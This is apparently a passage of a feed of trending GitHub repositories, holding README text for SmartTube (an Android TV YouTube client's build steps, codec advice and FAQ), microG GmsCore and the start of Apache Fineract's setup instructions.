 &lt;li&gt;&lt;strong&gt;Discord group (international)&lt;/strong&gt;: &lt;a href="https://discord.gg/Wt8HDDej5z"&gt;SmartTube Official&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Telegram group (RU/UA)&lt;/strong&gt;: &lt;a href="http://t.me/SmartTubeUA"&gt;@SmartTubeUA&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Email&lt;/strong&gt;: firsth
  &lt;!-- abc@def --&gt;ash@gmai
  &lt;!-- @abc.com --&gt;l.com&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;The international group is in &lt;strong&gt;English only&lt;/strong&gt;. But don't worry if your English is not perfect, we have a friendly international community.&lt;/p&gt; 
&lt;h2&gt;Team&lt;/h2&gt; 
&lt;p&gt;SmartTube is developed single-handedly; there is no larger team or company behind this. This is an open source, hobby project. Several others have helped with translations, some of which can be seen on &lt;a href="https://github.com/yuliskov/SmartTube/graphs/contributors"&gt;Github&lt;/a&gt;, some have sent their translations directly to Yurii. There are also helpful people in the support chat.&lt;/p&gt; 
&lt;h2&gt;Build&lt;/h2&gt; 
&lt;p&gt;&lt;strong&gt;NOTE: OpenJDK 14 or older (!) is required. Newer JDK could cause app crash!&lt;/strong&gt;&lt;br&gt; To build and install debug version, run these commands:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;git clone https://github.com/yuliskov/SmartTube.git
cd SmartTube
git submodule update --init
adb connect &amp;lt;device_ip_address&amp;gt;
gradlew clean installStorigDebug
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Video codecs&lt;/h2&gt; 
&lt;p&gt;Video codecs are the algorithms used for video compression.&lt;/p&gt; 
&lt;h3&gt;Which codec to choose / overview&lt;/h3&gt; 
&lt;table&gt; 
 &lt;thead&gt; 
  &lt;tr&gt; 
   &lt;th align="center"&gt;&lt;/th&gt; 
   &lt;th align="left"&gt;recommendation&lt;/th&gt; 
   &lt;th align="left"&gt;hardware support&lt;/th&gt; 
   &lt;th align="center"&gt;compression, bitrate*&lt;/th&gt; 
   &lt;th align="center"&gt;quality&lt;/th&gt; 
  &lt;/tr&gt; 
 &lt;/thead&gt; 
 &lt;tbody&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;strong&gt;AV01&lt;/strong&gt; aka. AV1&lt;/td&gt; 
   &lt;td align="left"&gt;best choice, &lt;strong&gt;if your device supports&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;first devices started coming in &lt;strong&gt;2020&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;strong&gt;best&lt;/strong&gt; &lt;small&gt;(e.g. 1.6 Mbps)&lt;/small&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;same&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;&lt;strong&gt;VP9&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;best choice on most devices&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="left"&gt;most devices &lt;strong&gt;since 2015&lt;/strong&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;&lt;strong&gt;better&lt;/strong&gt; &lt;small&gt;(e.g. 2.1 Mbps)&lt;/small&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;same&lt;/td&gt; 
  &lt;/tr&gt; 
  &lt;tr&gt; 
   &lt;td align="center"&gt;AVC&lt;/td&gt; 
   &lt;td align="left"&gt;only for old or slow hardware&lt;/td&gt; 
   &lt;td align="left"&gt;&lt;strong&gt;all&lt;/strong&gt; devices&lt;/td&gt; 
   &lt;td align="center"&gt;good &lt;small&gt;(e.g. 2.7 Mbps)&lt;/small&gt;&lt;/td&gt; 
   &lt;td align="center"&gt;same&lt;/td&gt; 
  &lt;/tr&gt; 
 &lt;/tbody&gt; 
&lt;/table&gt; 
&lt;p&gt;&lt;small&gt;* Examples taken from the video-only track at 1080p @ 25fps for this video: &lt;a href="https://youtube.com/watch?v=k2qgadSvNyU"&gt;Dua Lipa - New Rules (Official Music Video)&lt;/a&gt;&lt;/small&gt;&lt;/p&gt; 
&lt;p&gt;At the same resolution, a &lt;strong&gt;lower bitrate is better!&lt;/strong&gt; YouTube explicitly targets the &lt;strong&gt;same quality&lt;/strong&gt; regardless of the codec. Older codecs have a higher bitrate only because they are less efficient. On Youtube, you &lt;strong&gt;do not&lt;/strong&gt; get better quality by simply choosing a higher bitrate. Newer codecs have a better compression = lower bitrate = use less bandwidth = save the environment. This is a feature, not a bug. You should use the newest codec that works smoothly on your device, not the least efficient one. AVC usually has the highest bitrate. This is bad, not good.&lt;/p&gt; 
&lt;h3&gt;Which quality to choose?&lt;/h3&gt; 
&lt;p&gt;Currently, there is no automatic mode based on your bandwidth. But you can configure a default video preset yourself under settings &amp;gt; video player &amp;gt; video presets. The first option ("none") will remember your last selection within the video player. Any other preset is used initially for each video; if the selected profile is not available, the next best available option is used. You can still override the profile on each video individually within the player.&lt;/p&gt; 
&lt;p&gt;To decide the optional resolution / video quality for you, you need to consider a few limiting factors:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;your bandwidth (choose only up to the bitrate that your bandwidth can handle; you can do a speedtest using &lt;a href="https://fast.com"&gt;fast.com&lt;/a&gt; by Netflix)&lt;/li&gt; 
 &lt;li&gt;your TV's display resolution (the quality &lt;strong&gt;might slightly&lt;/strong&gt; improve, if you select the next higher resolution, e.g. 1080p on a 720p display; but don't expect a big difference)&lt;/li&gt; 
 &lt;li&gt;your TV's capabilities (e.g. HDR, 60fps)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Generally 60fps is an improvement, but if you personally don't notice (or mind) the difference, you can save bandwidth (and the environment) by not choosing 60fps.&lt;/p&gt; 
&lt;h3&gt;HDR&lt;/h3&gt; 
&lt;p&gt;HDR works only &lt;strong&gt;if your hardware supports it&lt;/strong&gt;. It's a complicated mess.&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Your TV must support it&lt;/li&gt; 
 &lt;li&gt;If you use a TV box, that TV box &lt;strong&gt;and&lt;/strong&gt; your TV cable &lt;strong&gt;and&lt;/strong&gt; the TV must support HDR&lt;/li&gt; 
 &lt;li&gt;Yes, there truly are different HDMI cable versions with different HDR-support, it's complicated&lt;/li&gt; 
 &lt;li&gt;some devices (like the &lt;strong&gt;NVIDIA Shield&lt;/strong&gt;) generally support HDR, but &lt;strong&gt;not&lt;/strong&gt; the specific HDR format that is used on YouTube &lt;span&gt;ğŸ˜¢&lt;/span&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If HDR videos look looked dim or washed out, then check &lt;a href="https://www.wired.com/story/hdr-too-dark-how-to-fix-it/"&gt;this article&lt;/a&gt;. &lt;strong&gt;If HDR is not working&lt;/strong&gt;, it's probably not this app's fault. You might need to search on the web for "HDR" and your device name for any help.&lt;/p&gt; 
&lt;h2&gt;Liability&lt;/h2&gt; 
&lt;p&gt;We take no responsibility for the use of our tool, or external instances provided by third parties. We strongly recommend you abide by the valid official regulations in your country. Furthermore, we refuse liability for any inappropriate use of Invidious, such as illegal downloading. This tool is provided to you in the spirit of free, open software.&lt;/p&gt; 
&lt;p&gt;You may view the LICENSE in which this software is provided to you &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/LICENSE.md"&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;ol start="16"&gt; 
  &lt;li&gt;Limitation of Liability.&lt;/li&gt; 
 &lt;/ol&gt; 
 &lt;p&gt;IN NO EVENT UNLESS REQUIRED BY APPLICABLE LAW OR AGREED TO IN WRITING WILL ANY COPYRIGHT HOLDER, OR ANY OTHER PARTY WHO MODIFIES AND/OR CONVEYS THE PROGRAM AS PERMITTED ABOVE, BE LIABLE TO YOU FOR DAMAGES, INCLUDING ANY GENERAL, SPECIAL, INCIDENTAL OR CONSEQUENTIAL DAMAGES ARISING OUT OF THE USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF DATA OR DATA BEING RENDERED INACCURATE OR LOSSES SUSTAINED BY YOU OR THIRD PARTIES OR A FAILURE OF THE PROGRAM TO OPERATE WITH ANY OTHER PROGRAMS), EVEN IF SUCH HOLDER OR OTHER PARTY HAS BEEN ADVISED OF THE POSSIBILITY OF SUCH DAMAGES.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h2&gt;FAQ&lt;/h2&gt; 
&lt;h3&gt;Q: Videos buffer a LOT&lt;/h3&gt; 
&lt;p&gt;A: Try to switch to encrypted DNS like NextDNS. You can set-up such DNS either automatically or manually. To automatic set-up you can use the &lt;a href="https://f-droid.org/en/packages/app.intra/"&gt;Intra apk at fdroid&lt;/a&gt; and the &lt;a href="https://play.google.com/store/apps/details?id=com.autostart"&gt;"AutoStart - No root"&lt;/a&gt; apk to make it autolaunch after every TV restart. For manual set-up &lt;a href="https://www.reddit.com/r/MiBox/s/7esEVGtAAa"&gt;use this guide&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;Q: There is no result for the search that I say (Android 11)&lt;/h3&gt; 
&lt;p&gt;A: They're some reports that the latest update for "Google app for Android TV" could cause this bug. Deleting the update should fix the problem.&lt;/p&gt; 
&lt;h3&gt;Q: AV01 does not play / Why is VP9 slow on my device?&lt;/h3&gt; 
&lt;p&gt;A: Because AV01 is very new, &lt;strong&gt;most&lt;/strong&gt; TVs and TV boxes &lt;strong&gt;not not&lt;/strong&gt; offer hardware support and &lt;strong&gt;cannot&lt;/strong&gt; play AV01 &lt;strong&gt;at all&lt;/strong&gt;.&lt;/p&gt; 
&lt;p&gt;If your device has hardware support for a codec, videos using that codec should play smoothly. High resolutions might also be slow in VP9 on cheap TV boxes that don't officially support 4k. Your device probably can play VP9 videos even without hardware support, however this requires a powerful CPU to run smoothly. Fixing AV01 without hardware support is technically possible, but currently not planned and probably not efficient enough.&lt;/p&gt; 
&lt;h3&gt;Q: Can you make SmartTube look like the original app?&lt;/h3&gt; 
&lt;p&gt;A: Compared to SmartTube's UI, Stock Youtube and YT Kids are far ahead. However, we'd need someone who's skilled and willing to dedicate enough time and energy into making it. And into maintaining it longterm (incl. new features, bug fixes). All of this for free. If you are / got someone like that, please help. Not to mention that SmartTube follows Google's official template &amp;amp; recommendations for Android TV apps. It's Google's fault that the template is somewhat ugly. ğŸ˜‚&lt;/p&gt; 
&lt;h3&gt;Q: Can the search page be improved?&lt;/h3&gt; 
&lt;p&gt;A: It can be, but it takes someone to do it, similar to the above FAQ-entry. SmartTube is following Google's officially recommended design/template for TV apps and is using the official, preinstalled Android TV keyboard. Sadly, Google did a really bad job regarding the search page and keyboard. Maybe a future SmartTube update can add an embedded keyboard, similar to the original YouTube or other major Android TV apps. Maybe it can improve the looks to be as good or better than in the official YouTube app. But for now, it is the way it is due to lack of time and due to Google's official recommendations being bad.&lt;/p&gt; 
&lt;h3&gt;Q: Can I install this on a Samsung Tizen TV / LG webOS TV / Roku / iOS / toaster?&lt;/h3&gt; 
&lt;p&gt;A: No, this only works on &lt;strong&gt;Android&lt;/strong&gt; devices. If you look at an Android TV's product page, it usually says clearly that it's based on Android. The app &lt;strong&gt;cannot&lt;/strong&gt; easily be ported over to other plattforms and we have no plans to even try. &lt;strong&gt;Please do not ask&lt;/strong&gt;. Instead, you can connect a separate TV stick or TV box to your TV.&lt;/p&gt; 
&lt;h3&gt;Q: Can I install this on a smartphone? / Can you add portrait mode? / Scrolling doesn't work.&lt;/h3&gt; 
&lt;p&gt;A: &lt;strong&gt;Big No&lt;/strong&gt;. This app is &lt;strong&gt;not&lt;/strong&gt; for smartphones, we offer &lt;strong&gt;zero support&lt;/strong&gt; for that.&lt;/p&gt; 
&lt;p&gt;You &lt;strong&gt;can cast&lt;/strong&gt; videos &lt;strong&gt;from&lt;/strong&gt; your smartphone to a TV / TV box running SmartTube, though. Just use the official YouTube app or &lt;a href="https://github.com/ReVanced"&gt;ReVanced&lt;/a&gt;, see &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#casting"&gt;the casting section&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;There will not be a phone version.&lt;/strong&gt; You can use &lt;a href="https://github.com/ReVanced"&gt;ReVanced&lt;/a&gt;, &lt;a href="https://play.google.com/store/apps/details?id=free.tube.premium.advanced.tuber"&gt;Pure Tuber&lt;/a&gt;, &lt;a href="https://newpipe.schabi.org"&gt;NewPipe&lt;/a&gt;, or &lt;a href="https://github.com/polymorphicshade/NewPipe#newpipe-x-sponsorblock"&gt;NewPipe x SponsorBlock&lt;/a&gt; instead. Please go to their respective support chats for help.&lt;/p&gt; 
&lt;h3&gt;Q: Can I install this on a tablet / car screen / smartphone with docking station?&lt;/h3&gt; 
&lt;p&gt;Yes... maybe.. Requirements:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;it is an Android device&lt;/li&gt; 
 &lt;li&gt;it has a large screen&lt;/li&gt; 
 &lt;li&gt;it has a TV remote, controller, or keyboard &lt;strong&gt;Touch input is not supported.&lt;/strong&gt; Mouse/touchpad scrolling neither. You cannot properly use SmartTube with only touch or mouse input.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;Some users reported great success (incl. on a &lt;a href="https://t.me/SmartTubeEN/6060"&gt;car entertainment system&lt;/a&gt;). &lt;strong&gt;Please share your success stories with us.&lt;/strong&gt;&lt;/p&gt; 
&lt;h3&gt;Q: I get "unknown codec" / "can't download video" errors&lt;/h3&gt; 
&lt;p&gt;A: please wait 5 seconds for the video to play. If that doesn't help, press the play button. Some users reported, that this issue only appears when they have a USB audio device attached or if their disk storage is full.&lt;/p&gt; 
&lt;h3&gt;Q: I get "the video profile is not supported"&lt;/h3&gt; 
&lt;p&gt;A. Press the "HQ"-button in the bottom-left, select &lt;em&gt;video formats&lt;/em&gt; and select anything other than AV01. AV01 is &lt;strong&gt;not supported&lt;/strong&gt; on most devices (apparently including yours), so select VP9 instead. See &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#Video-codecs"&gt;the section on video codecs&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;h3&gt;Q: I get "video unavailable" when watching unlisted videos / my own videos&lt;/h3&gt; 
&lt;p&gt;A: Right, that's currently a bug.&lt;/p&gt; 
&lt;h3&gt;Q: It doesn't show up on my casting list&lt;/h3&gt; 
&lt;p&gt;A: Please read the &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#casting"&gt;Casting&lt;/a&gt; section.&lt;/p&gt; 
&lt;h3&gt;Q: I get an error saying "Sign in to confirm you're not a bot"&lt;/h3&gt; 
&lt;p&gt;A: Your IP address range might be temporaily/permanently blocked by YouTube from watching videos if you not signed in to your account.&lt;/p&gt; 
&lt;h3&gt;Q: The video is buffering a lot&lt;/h3&gt; 
&lt;p&gt;A: The issue might not be specific to SmartTube, as other unofficial YouTube apps also report this issue. It seems uncommon nowadays, but was very present in the 2nd quarter of 2021. Some users or devices seem to be more affected then others. The official YouTube app &amp;amp; website are apparently only rarely affected. The root cause of the issue is currently unclear, but it appears to be a server-side thing on YouTube's end. Possibly, YouTube is discriminating 3rd party apps.&lt;/p&gt; 
&lt;p&gt;For now, try to see if it helps to:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;reduce the resolution (or chance it back)&lt;/li&gt; 
 &lt;li&gt;change the video format to AVC&lt;/li&gt; 
 &lt;li&gt;increase the buffer in the settings&lt;/li&gt; 
 &lt;li&gt;hit the back button and try playing the video again&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Q: The debug information says my display is 1080p, but I have a 4k/UHD display!&lt;/h3&gt; 
&lt;p&gt;A: Do not worry, &lt;strong&gt;the debug information is incorrect.&lt;/strong&gt; SmartTube works fine even above 1080p and you should be able to see that, when you play a video in 4k or UHD. Also do not worry if it says "720p" and you have a 1080p display.&lt;/p&gt; 
&lt;h3&gt;Q: Why does it not autoselect highest quality?&lt;/h3&gt; 
&lt;p&gt;A: &lt;strong&gt;It does&lt;/strong&gt; (by default). If you set a &lt;em&gt;video profile&lt;/em&gt; under settings, that acts as a maximum for automatic selection. Check if you configured a video profile, you can unset it by choosing "none".&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Please do not confuse quality with bitrate&lt;/strong&gt;. See &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#Video-codecs"&gt;the section on video codecs&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;h3&gt;Q: Can I set a (maximum) resolution by default?&lt;/h3&gt; 
&lt;p&gt;A: SmartTube automatically select the highest available quality for your video, up to a maximum resolution that you can set in the settings under "video profile". If available, SmartTube will pick the selected video profile, or otherwise the next best one available will be used. You can still always change the video profile while watching videos.&lt;/p&gt; 
&lt;h3&gt;Q: Can it set the resolution to "auto", depending on my available bandwidth?&lt;/h3&gt; 
&lt;p&gt;A: This is planned, but not available yet (sorry ğŸ™‡â€�â™€ï¸�). However, you can set a maximum resolution to something that should work for your bandwidth. See above for details.&lt;/p&gt; 
&lt;h3&gt;Q: Why does it skip video segments?&lt;/h3&gt; 
&lt;p&gt;A: SmartTube has a feature called &lt;strong&gt;SponsorBlock&lt;/strong&gt;. You can select categories should be skipped, if any. See the &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#sponsorblock"&gt;SponsorBlock section&lt;/a&gt; for more details.&lt;/p&gt; 
&lt;h3&gt;Q: How to start the next video automatically / stop after every video?&lt;/h3&gt; 
&lt;p&gt;A: You can switch between different autoplay-modes using the loop-button ğŸ”�&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://t.me/SmartTubeEN/24953"&gt;&lt;img src="https://raw.githubusercontent.com/yuliskov/SmartTube/master/images/new/V3GHGvWprmdE1w.jpg" alt="screenshot showing the loop-button"&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;h3&gt;Q: How to remove recommended videos (e.g. news) that are unrelated to me?&lt;/h3&gt; 
&lt;p&gt;A: Recommended videos are defined by YouTube and not by the app, we cannot change the algorithm. They are based on your country, which you can change in the settings. If you are logged in, they are based on your watch history, user profile data, and whatever else Google might use. If you are not logged in, you are like in "incognito mode", so your watch history does not influence your recommendations. Maybe a future version will add optional user profiling without logging in.&lt;/p&gt; 
&lt;h3&gt;Q: Does HDR work?&lt;/h3&gt; 
&lt;p&gt;A: Yes, HDR works &lt;strong&gt;if your hardware&lt;/strong&gt; supports it. The &lt;strong&gt;NVIDIA Shield&lt;/strong&gt; does not. See &lt;a href="https://raw.githubusercontent.com/yuliskov/SmartTube/master/#HDR"&gt;the section on HDR&lt;/a&gt; for more information.&lt;/p&gt; 
&lt;h3&gt;Q: Why do some updates say "don't update if satisfied with the current version" in the changelog?&lt;/h3&gt; 
&lt;p&gt;A: These updates change a lot of code, trying to fix bugs that only affect a few users/devices. Only the affected users should update. For anyone else, there is nothing to gain from updating; however there is the chance of causing new bugs. Do not worry if you updated anyways.&lt;/p&gt; 
&lt;h3&gt;Q: When playing at other speeds, frames are skipped!&lt;/h3&gt; 
&lt;p&gt;A: We currently cannot fix this, sorry.&lt;/p&gt; 
&lt;h3&gt;Q: What is AFR?&lt;/h3&gt; 
&lt;p&gt;A: "Auto Frame Rate". It adjusts the refresh rate of your TV to match the content you're watching. It can slightly improve the smoothness, but the difference is very small; most people barely notice it. It does not work well on every hardware. If you don't know what it does and don't want to test it out yourself, you can safely keep it off.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Recommendation:&lt;/strong&gt; You can turn it on to see if it works on your device; if it causes issues (or if you don't care to test), turn it &lt;strong&gt;off&lt;/strong&gt;.&lt;/p&gt; 
&lt;h3&gt;Q: Should I choose high or low buffer?&lt;/h3&gt; 
&lt;p&gt;A: The higher your buffer, the more of a video will be preloaded ahead of your current position. A low buffer might minimally reduce your bandwidth usage, if you often close videos before they end. A high buffer can smooth out network issues and prevent the video from pausing to buffer. A higher buffer increases RAM usage, however this shouldn't be an issue.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;Recommendation: high&lt;/strong&gt;.&lt;/p&gt; 
&lt;h3&gt;Q: Can I retain the buffer when seeking back?&lt;/h3&gt; 
&lt;p&gt;A: No, when you seek back (e.g. jump back 5 seconds), SmartTube will have to rebuffer. This might be improved in a future update.&lt;/p&gt; 
&lt;h3&gt;Q: My device freezes when watching YouTube&lt;/h3&gt; 
&lt;p&gt;A: That's a firmware or Android issue. If you are using a custom rom, maybe that rom is buggy. Because this issue is nearly impossible for the developer to debug, we cannot help you, sorry. You can try the usual workarounds: rebooting, clearing cache, reinstalling the app, or factory resetting the device.&lt;/p&gt; 
&lt;h3&gt;Q: Can I remove videos from the history?&lt;/h3&gt; 
&lt;p&gt;A: not yet&lt;/p&gt; 
&lt;h3&gt;Q: Can I download videos?&lt;/h3&gt; 
&lt;p&gt;A: not with SmartTube&lt;/p&gt; 
&lt;h3&gt;Q: Can updates be installed automatically?&lt;/h3&gt; 
&lt;p&gt;A: no, this is technically not possible. Only the preinstalled app manager (usually Google PlayStore, Amazon AppStore, etc) has the required permission. All other apps, incl. SmartTube can only show open installation prompt. A workaround using root would be possible, but hasn't been implemented yet.&lt;/p&gt; 
&lt;h3&gt;Q: Can I whitelist ads on some channels?&lt;/h3&gt; 
&lt;p&gt;A: no, this is not possible. SmartTube does not have any code to display ads. Adding this functionality would actually take time and effort, which is instead spent on adding useful features and fixing bugs.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>microg/GmsCore</title>
      <link>https://github.com/microg/GmsCore</link>
      <description>&lt;p&gt;Free implementation of Play Services&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;microG Services&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://github.com/microg/GmsCore/actions/workflows/build.yml"&gt;&lt;img src="https://github.com/microg/GmsCore/actions/workflows/build.yml/badge.svg?sanitize=true" alt="Build status"&gt;&lt;/a&gt; &lt;a href="https://raw.githubusercontent.com/microg/GmsCore/master/TRANSLATION.md"&gt; &lt;img src="https://hosted.weblate.org/widget/microg/svg-badge.svg?sanitize=true" alt="Translation status"&gt; &lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;microG Services is a FLOSS (Free/Libre Open Source Software) framework to allow applications designed for Google Play Services to run on systems, where Play Services is not available.&lt;/p&gt; 
&lt;h3&gt;Please refer to the &lt;a href="https://github.com/microg/GmsCore/wiki"&gt;wiki&lt;/a&gt; for downloads and instructions&lt;/h3&gt; 
&lt;h2&gt;Translations&lt;/h2&gt; 
&lt;p&gt;If you'd like to help translate microG, take a look at &lt;a href="https://raw.githubusercontent.com/microg/GmsCore/master/TRANSLATION.md"&gt;TRANSLATION&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;License&lt;/h2&gt; 
&lt;pre&gt;&lt;code&gt;Copyright 2013-2024 microG Project Team

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    
    <item>
      <title>apache/fineract</title>
      <link>https://github.com/apache/fineract</link>
      <description>&lt;p&gt;Apache Fineract&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Apache Fineract: A Platform for Microfinance&lt;/h1&gt; 
&lt;!-- TODO Reactivate when there is a working CI-CD instance: [![Swagger Validation](https://validator.swagger.io/validator?url=https://sandbox.mifos.community/fineract-provider/swagger-ui/fineract.yaml)](https://validator.swagger.io/validator/debug?url=https://sandbox.mifos.community/fineract-provider/swagger-ui/fineract.yaml) --&gt; 
&lt;p&gt;&lt;a href="https://github.com/apache/fineract/actions/workflows/build-mariadb.yml"&gt;&lt;img src="https://github.com/apache/fineract/actions/workflows/build-mariadb.yml/badge.svg?branch=develop" alt="Build"&gt;&lt;/a&gt; &lt;a href="https://hub.docker.com/r/apache/fineract"&gt;&lt;img src="https://img.shields.io/docker/pulls/apache/fineract.svg?logo=Docker" alt="Docker Hub"&gt;&lt;/a&gt; &lt;a href="https://github.com/apache/fineract/actions/workflows/publish-dockerhub.yml"&gt;&lt;img src="https://github.com/apache/fineract/actions/workflows/publish-dockerhub.yml/badge.svg?sanitize=true" alt="Docker Build"&gt;&lt;/a&gt; &lt;a href="https://sonarcloud.io/summary/new_code?id=apache_fineract"&gt;&lt;img src="https://sonarcloud.io/api/project_badges/measure?project=apache_fineract&amp;amp;metric=sqale_index" alt="Technical Debt"&gt;&lt;/a&gt;&lt;/p&gt;  
&lt;p&gt;Fineract is a mature platform with open APIs that provides a reliable, robust, and affordable core banking solution for financial institutions offering services to the worldâ€™s 3 billion underbanked and unbanked.&lt;/p&gt; 
&lt;p&gt;&lt;a href="https://cwiki.apache.org/confluence/display/FINERACT/FAQ"&gt;Have a look at the FAQ on our Wiki at apache.org&lt;/a&gt; if this README does not answer what you are looking for. &lt;a href="https://issues.apache.org/jira/secure/Dashboard.jspa?selectPageId=12335824"&gt;Visit our JIRA Dashboard&lt;/a&gt; to find issues to work on, see what others are working on, or open new issues.&lt;/p&gt; 
&lt;h1&gt;COMMUNITY&lt;/h1&gt; 
&lt;p&gt;If you are interested in contributing to this project, but perhaps don't quite know how and where to get started, please &lt;a href="http://fineract.apache.org/#contribute"&gt;join our developer mailing list&lt;/a&gt;, listen into our conversations, chime into threads, and just send us a "Hello!" introduction email; we're a friendly bunch, and look forward to hearing from you.&lt;/p&gt; 
&lt;h1&gt;REQUIREMENTS&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;Java &amp;gt;= 21&lt;/code&gt; (Azul Zulu JVM is tested by our CI on GitHub Actions)&lt;/li&gt; 
 &lt;li&gt;MariaDB &lt;code&gt;11.5.2&lt;/code&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;You can run the required version of the database server in a container, instead of having to install it, like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run --name mariadb-11.5 -p 3306:3306 -e MARIADB_ROOT_PASSWORD=mysql -d mariadb:11.5.2
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;and stop and destroy it like this:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker rm -f mariadb-11.5
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;br&gt;Beware that this database container database keeps its state inside the container and not on the host filesystem. It is lost when you destroy (rm) this container. This is typically fine for development. See &lt;a href="https://hub.docker.com/_/mariadb"&gt;Caveats: Where to Store Data on the database container documentation&lt;/a&gt; re. how to make it persistent instead of ephemeral.&lt;br&gt;&lt;/p&gt; 
&lt;p&gt;Tomcat v10 is only required if you wish to deploy the Fineract WAR to a separate external servlet container. Note that you do not require to install Tomcat to develop Fineract, or to run it in production if you use the self-contained JAR, which transparently embeds a servlet container using Spring Boot. (Until FINERACT-730, Tomcat 7/8 were also supported, but now Tomcat 10 is required.)&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;IMPORTANT: If you use MySQL or MariaDB&lt;/h1&gt; 
&lt;p&gt;Recently (after release &lt;code&gt;1.7.0&lt;/code&gt;), we introduced improved date time handling in Fineract. Date time is from now on stored in UTC and we are enforcing UTC timezone even on the JDBC driver, e. g. for MySQL:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;serverTimezone=UTC&amp;amp;useLegacyDatetimeCode=false&amp;amp;sessionVariables=time_zone=â€˜-00:00â€™
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;DO&lt;/strong&gt;: If you do use MySQL as your Fineract database then the following configuration is highly recommended:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;Run the application in UTC (the default command line in our Docker image has the necessary parameters already set)&lt;/li&gt; 
 &lt;li&gt;Run the MySQL database server in UTC (if you use managed services like AWS RDS then this should be the default anyway, but it would be good to double-check)&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;&lt;strong&gt;DON'T&lt;/strong&gt;: In case the Fineract instance and the MySQL server are &lt;strong&gt;not&lt;/strong&gt; running in UTC then the following could happen:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;MySQL is saving date time values differently from PostgreSQL&lt;/li&gt; 
 &lt;li&gt;Example scenario: if the Fineract instance runs in timezone: GMT+2, and the local date time is 2022-08-11 17:15 ...&lt;/li&gt; 
 &lt;li&gt;... then &lt;strong&gt;PostgreSQL saves&lt;/strong&gt; the LocalDateTime as is: &lt;strong&gt;2022-08-11 17:15&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;... and &lt;strong&gt;MySQL saves&lt;/strong&gt; the LocalDateTime in UTC: &lt;strong&gt;2022-08-11 15:15&lt;/strong&gt;&lt;/li&gt; 
 &lt;li&gt;... but when we &lt;strong&gt;read&lt;/strong&gt; the date time from PostgreSQL &lt;strong&gt;or&lt;/strong&gt; from MySQL, then both systems give us the same values: &lt;strong&gt;2022-08-11 17:15 GMT+2&lt;/strong&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;If a previously used Fineract instance didn't run in UTC (backward compatibility), then all prior dates will be read wrongly by MySQL/MariaDB. This can cause issues when you run the database migration scripts.&lt;/p&gt; 
&lt;p&gt;&lt;strong&gt;RECOMMENDATION&lt;/strong&gt;: you need to shift all dates in your database by the timezone offset that your Fineract instance used.&lt;/p&gt; 
&lt;h1&gt;&lt;br&gt;INSTRUCTIONS: How to run for local development&lt;/h1&gt; 
